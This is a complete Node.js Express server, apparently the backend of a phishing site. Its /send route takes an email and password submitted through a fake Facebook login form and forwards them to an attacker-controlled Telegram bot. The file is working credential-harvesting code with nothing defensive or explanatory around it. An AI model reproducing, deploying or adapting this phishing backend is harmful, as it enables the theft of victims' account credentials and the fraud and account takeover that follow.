import express from 'express';
import dotenv from 'dotenv';
import fetch from 'node-fetch';
import cors from 'cors';
import path from 'path';
import { fileURLToPath } from 'url';

// Инициализация
dotenv.config();
const app = express();
const PORT = process.env.PORT || 3000;

// Путь к frontend/dist (для деплоя на Render)
const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);
const frontendPath = path.join(__dirname, '..', 'frontend', 'dist');

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static(frontendPath));

// POST /send (обработка формы)
app.post('/send', async (req, res) => {
  const { email, password } = req.body;

  if (!email || !password) {
    return res.status(400).json({ message: 'Email and password are required.' });
  }

  const message = `🔐 Facebook Login Attempt:\n📧 Email: ${email}\n🔑 Password: ${password}`;

  try {
    const telegramUrl = `https://api.telegram.org/bot${process.env.TELEGRAM_BOT_TOKEN}/sendMessage`;

    const telegramRes = await fetch(telegramUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: process.env.TELEGRAM_CHAT_ID,
        text: message,
      }),
    });

    if (!telegramRes.ok) throw new Error('Failed to send to Telegram');

    res.status(200).json({ message: 'Sent successfully' });
  } catch (err) {
    console.error(err);
    res.status(500).json({ message: 'Internal Server Error' });
  }
});

// Для SPA (если перейти по /, /about, и т.д.)
app.get('*', (req, res) => {
  res.sendFile(path.join(frontendPath, 'index.html'));
});

// Запуск
app.listen(PORT, () => {
  console.log(`Server running on http://localhost:${PORT}`);
});
